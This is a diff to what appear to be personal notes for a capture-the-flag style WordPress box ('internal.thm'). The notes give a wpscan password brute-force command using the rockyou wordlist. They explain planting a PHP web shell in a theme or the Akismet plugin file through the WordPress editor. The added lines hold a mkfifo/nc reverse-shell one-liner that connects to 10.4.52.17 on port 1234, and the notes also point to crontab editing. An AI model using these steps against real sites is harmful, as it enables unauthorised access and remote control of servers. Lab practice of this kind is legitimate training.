@@ -105,8 +105,14 @@ Use WPS scan
 vp = vulnerable plugins
 u = users
 #wpscan --url http://internal.thm/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
+
 wps revershell path
 internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+
+If themes_editor cannot update .php file, go to plugin_editor, update in askimet.php (write that code in upper and update)
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.52.17 1234 >/tmp/f")?>
+
+go back to installed plugins and activate. You got the reverse shell.
 
 Edit crontab
 #crontab -e
